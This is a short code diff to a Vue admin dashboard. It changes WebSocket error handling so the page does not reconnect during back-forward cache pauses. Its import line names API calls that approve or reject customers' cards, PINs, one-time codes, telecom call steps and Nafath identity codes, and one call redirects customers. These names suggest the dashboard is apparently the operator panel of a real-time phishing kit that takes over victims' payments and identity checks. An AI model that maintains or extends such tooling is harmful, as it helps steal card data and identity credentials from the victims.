@@ -132,7 +132,7 @@ defineOptions({ name: 'DashboardHome' });
 import { getCustomers, getCustomer, deleteCustomerCard, approveCard, rejectCard, approveOtp, rejectOtp, approvePin, rejectPin, approvePhoneData, rejectPhoneData, approvePhoneOtp, rejectPhoneOtp, approveStcWaiting, rejectStcWaiting, approveStcOtp, rejectStcOtp, approveStcCall, rejectStcCall, approveNafath, rejectNafath, updateNafathVerificationCode, redirectCustomer } from '@/api/dashboard';
 import request from '@/api/request';
 import { registerPollingCallback, unregisterPollingCallback, setPollingPaused, setWsConnected, markInitialLoadComplete } from '@/services/adminPolling';
-import { getEcho } from '@/services/echo';
+import { getEcho, isEchoPageLifecycleErrorExpected } from '@/services/echo';
 import { useNotificationsStore } from '@/store/modules/notifications';
 import { useBadgeStore } from '@/store/modules/badges';
 import CustomerDataTable from '../components/CustomerDataTable.vue';
@@ -659,7 +659,9 @@ async function connectDashboardWebSocket () {
                 // Stringify to capture full error details (code, message, type)
                 const detail = typeof err === 'object' ? JSON.stringify( err ) : err;
                 const code = err?.data?.code || err?.error?.data?.code;
-                if ( code === 1006 ) {
+                if ( isEchoPageLifecycleErrorExpected() ) {
+                    logger.debug( '[Dashboard WS] Pusher paused for back-forward cache', detail );
+                } else if ( code === 1006 ) {
                     logger.warn( '[Dashboard WS] Pusher transient close (1006) — waiting for auto-reconnect', detail );
                 } else {
                     logger.error( '[Dashboard WS] Pusher error:', detail, err );
@@ -781,6 +783,7 @@ async function connectDashboardWebSocket () {
 }
 
 function scheduleReconnect () {
+    if ( isEchoPageLifecycleErrorExpected() ) return;
     if ( _wsReconnectTimer ) return; // already scheduled
     _wsReconnectTimer = setTimeout( () => {
         _wsReconnectTimer = null;
